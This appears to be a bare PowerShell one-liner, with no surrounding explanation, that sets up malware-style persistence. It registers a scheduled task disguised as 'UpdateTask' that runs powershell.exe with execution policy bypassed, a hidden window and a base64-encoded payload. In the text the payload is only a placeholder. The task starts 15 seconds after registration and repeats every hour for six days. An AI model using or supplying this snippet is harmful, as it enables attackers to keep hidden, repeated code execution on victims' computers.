$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -windowstyle hidden -e BASE64_ENCODED_PAYLOAD_UTF16LE";$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(15) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Hours 144);$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings (New-ScheduledTaskSettingsSet);Register-ScheduledTask -TaskName "UpdateTask" -InputObject $Task -Force;